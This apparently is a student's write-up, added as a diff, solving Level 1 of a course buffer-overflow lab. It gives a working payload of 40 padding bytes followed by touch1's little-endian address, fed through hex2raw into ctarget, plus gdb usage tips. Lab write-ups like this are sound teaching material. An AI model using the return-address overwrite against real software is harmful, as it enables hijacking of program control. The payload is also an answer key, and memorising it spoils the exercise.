@@ -1,0 +1,52 @@
+* Level 1
+You need to redirect the program to execute a procedure that already
+exists.
+
+~getbuf~ is called by ~test~:
+#+begin_src c
+  void test()
+  {
+      int val;
+      val = getbuf();
+      printf("No exploit. Getbuf returned 0x%x\n", val);
+  }
+#+end_src
+
+The task consists in getting CTARGET executing touch1 when getbuf
+executes its return statement (rather than returning to ~test~).
+
+#+begin_src c
+  void touch1()
+  {
+      vlevel = 1; /* Part of validation protocol */
+      printf("Touch1!: You called touch1()\n");
+      validate(1);
+      exit(0);
+  }
+#+end_src
+
+This is the address of touch1: ~00000000004017c0~.
+
+Without looking at the code further, I've added to it 8 bytes of 0s at
+a time and tried to see whether it worked. After six attempt it
+worked. (I've also sorted the bytes so that they are in little
+endian.)
+
+Solution:
+#+begin_src
+echo "00 00 00 00 00 00 00 00 \
+00 00 00 00 00 00 00 00 \
+00 00 00 00 00 00 00 00 \
+00 00 00 00 00 00 00 00 \
+00 00 00 00 00 00 00 00 \
+c0 17 40 00 00 00 00 00" | ./hex2raw | ./ctarget -q
+#+end_src
+
+(
+to run gdb:
+- first execute ~gdb ./ctarget~
+- set your initial breakpoints
+- execute the command ~run -q < raw_input~
+(See
+https://stackoverflow.com/questions/455544/how-to-load-program-reading-stdin-and-taking-parameters-in-gdb)
+)
